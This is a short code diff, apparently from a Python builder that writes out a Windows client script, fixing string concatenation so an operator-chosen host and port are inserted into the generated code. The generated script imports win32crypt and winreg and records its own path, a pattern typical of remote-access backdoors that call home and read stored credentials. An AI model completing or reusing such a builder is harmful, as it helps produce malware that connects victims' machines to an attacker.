@@ -563,9 +563,9 @@ import win32api , winerror , win32event, win32crypt
 
 from winreg import *
 
-strHost = '"""str(ipy)+"""'
+strHost = '"""+str(ipy)+"""'
 
-intPort = """str(pty)+"""
+intPort = """+str(pty)+"""
 
 strPath = os.path.realpath(sys.argv[0])
 
